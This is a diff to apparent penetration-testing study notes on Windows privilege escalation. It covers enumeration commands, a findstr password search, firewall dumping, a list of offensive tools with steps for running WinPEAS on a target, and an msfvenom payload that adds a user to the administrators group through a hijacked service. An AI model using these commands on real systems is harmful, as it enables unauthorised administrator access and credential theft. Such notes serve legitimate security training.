@@ -1,5 +1,74 @@
 # Windows Privilege Escalation Notes
 
+# Windows Privilege Escalation - Enumeration Notes
+
+## **Initial Enumeration**
+
+### **System Enumeration**
+- `systeminfo` - OS, architecture, system language, domain, logged-on users.
+- `hostname getuid` - Current user.
+- `wmic qfe` - Check last patch date.
+- `wmic qfe get caption,description,hotfixid,installedOn` - Detailed patch info.
+- `wmic logicaldisk` / `list drives` - List available drives.
+- `wmic logicaldisk get caption,description,providername` - Show detailed drive info.
+- `wmic logicaldisk get caption` - List drive captions.
+
+### **User Enumeration**
+- `whoami` - Current user.
+- `whoami /priv` - List user privileges.
+- `whoami /groups` - List groups the user belongs to.
+- `net users` - List all users on the machine.
+- `net user <username>` - Get details of a specific user.
+- `net localgroup` - List local groups.
+- `net localgroup administrators` - Check who is part of the administrators group.
+
+### **Network Enumeration**
+- `ipconfig /all` - Show detailed network configuration.
+- `arp -a` - List ARP table entries.
+- `route print` - Display the system's routing table.
+- `netstat -ano` - Show active network connections and listening ports.
+
+### **Password Hunting**
+- `findstr /si password *.txt *.ini *.config` - Search for passwords in common text/config files.
+
+### **AV Enumeration**
+- `sc query windefend` - Check Windows Defender status.
+- `sc queryex type=service` - List all running services.
+- `netsh advfirewall firewall dump` - Dump firewall rules.
+- `netsh firewall show state` - Display firewall state.
+- `netsh firewall show config` - Show firewall configuration.
+
+---
+## **Exploring Automated Tools**
+
+### **Privilege Escalation Scripts & Tools**
+- **[WinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)** - Automated privilege escalation checker.
+- **[Windows PrivEsc Checklist](https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation)** - Comprehensive privilege escalation guide.
+- **[Sherlock](https://github.com/rasta-mouse/Sherlock)** - Detect missing privilege escalation patches.
+- **[Watson](https://github.com/rasta-mouse/Watson)** - Identify vulnerable Windows versions.
+- **[PowerUp](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)** - PowerShell-based privilege escalation framework.
+- **[JAWS](https://github.com/411Hall/JAWS)** - Automated Windows enumeration.
+- **[Windows Exploit Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)** - Check for missing security patches.
+- **[Metasploit Local Exploit Suggester](https://blog.rapid7.com/2015/08/11/metasploit-local-exploit-suggester-do-less-get-more/)** - Suggests local exploits in Metasploit.
+- **[Seatbelt](https://github.com/GhostPack/Seatbelt)** - Post-exploitation enumeration.
+- **[SharpUp](https://github.com/GhostPack/SharpUp)** - C# implementation for privilege escalation checks.
+
+### **Running WinPEAS**
+1. Navigate to temp directory:
+   ```cmd
+   cd C:\Windows\Temp
+   ```
+2. Upload `winpeas.exe` to the target system.
+3. Execute:
+   ```cmd
+   winpeas.exe
+   ```
+   - If `winpeas.exe` fails, try using `PowerUp`.
+4. If using Metasploit:
+   ```cmd
+   run post/multi/recon/local_exploit_suggester
+   ```
+
 ## **Escalation Path: Kernel Exploits**
 
 ### **Automated Exploit Suggestion**
@@ -180,7 +249,4 @@
    msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe
    ```
 3. Move file and restart service.
-
----
-This guide covers common privilege escalation techniques on Windows. Let me know if you need further refinements! 🚀
 
